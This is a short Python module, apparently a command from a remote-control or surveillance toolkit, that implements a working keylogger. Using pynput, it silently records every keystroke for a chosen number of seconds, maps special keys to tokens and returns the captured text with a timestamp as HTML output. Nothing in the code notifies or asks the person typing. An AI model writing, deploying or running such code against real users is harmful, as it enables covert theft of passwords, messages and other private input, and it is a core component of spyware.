import datetime
from pynput import keyboard
import time

from .html_generator import html_msg

spec_key = {
    key: f'⌠{key}⌡'
    for key in [
        'ctrl', 'shift', 'tab',
        'esc', 'left windows', 'print screen',
        'end', 'delete', 'f1', 'f2', 'f3', 'f4', 
        'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
        'insert', 'down', 'page down',
        'right', 'clear', 'left',
        'home', 'up', 'num lock',
        'backspace', 'enter', 'right shift',
        'page up', 'space', 'alt',
        'caps lock', 'right alt', 'right ctrl',
    ]
}

spec_key['space'] = ' '

logger = []

def on_press(key):
    try:
        if key.char:
            res = key.char
        else:
            res = str(key)
            res = spec_key.get(res, res)
        logger.append(res)
    except AttributeError:
        res = str(key)
        res = spec_key.get(res, res)
        logger.append(res)

def __key_log(duration):
    global logger
    logger = []

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    time.sleep(duration)
    listener.stop()

    _time = datetime.datetime.now()
    content = f'{duration} seconds of key logging (from: {_time}): <span style="font-weight: bold;">' + ''.join(logger) + '</span>'

    return content

def get_key_log(duration=5):
    duration = int(duration)
    content = __key_log(duration)
    
    response = {
        'html': html_msg(content, status=None, bold_all=False),
        'data': None
    }
    
    return response
